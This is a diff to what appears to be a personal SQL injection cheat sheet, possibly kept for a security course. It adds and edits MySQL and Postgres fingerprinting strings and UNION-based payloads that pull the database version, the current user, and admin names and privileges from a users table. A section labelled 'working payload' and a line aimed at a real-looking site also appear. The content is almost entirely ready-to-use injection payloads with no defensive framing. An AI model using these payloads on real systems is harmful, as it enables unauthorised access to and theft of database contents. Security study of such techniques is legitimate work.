@@ -300,9 +300,11 @@ NOTE: SQL does not have 0th index for strings. Strings start at 1 e.g. SUBSTR('h
 **DB fingerprinting techniques:**
 ```sql
 /* MySQL */                                                        -- FINGERPRINTING:        
-   http://www.example.com/news.php?id=1 /*! AND 1=1 */--           -- via. comments
-   http://www.example.com/news.php?id=1 AND 'aa'=CONCAT('a','a')   -- via. MySQL CONCAT()
-   http://www.example.com/news.php?id=1 AND 1=2 UNION SELECT 1, 2, @@version  -- via. db version
+   ' union select current_user, 1'
+   ' union select @@version, 1'
+   news.php?id=1 /*! AND 1=1 */--           -- via. comments
+   news.php?id=1 AND 'aa'=CONCAT('a','a')   -- via. MySQL CONCAT()
+   news.php?id=1 AND 1=2 UNION SELECT 1, 2, @@version  -- via. db version
 
 /* Postgres */
    http://www.example.com/news.php?id=1 AND 1=1::int               -- via. typecast
@@ -386,9 +388,11 @@ ORDER BY N--
 /* Good guide on UNION injection */
 http://www.sqlinjection.net/union
 
-/* WORKING PAYLOAD (6443 BREAK) */
+/* WORKING PAYLOAD (6443 BREAK - MySQL) */
     ' union select null,null, . . . 1 from users      -- keep guessing no. of columns with select null,null,null ...
     ' union select name,priv from users where priv='admin'--
+    ' union all select @@version, 1'
+    ' union all select current_user, 1'
 
 /* Dump db version + db name */
     ns.agency/stuff.php?id=3 order by 1                                  
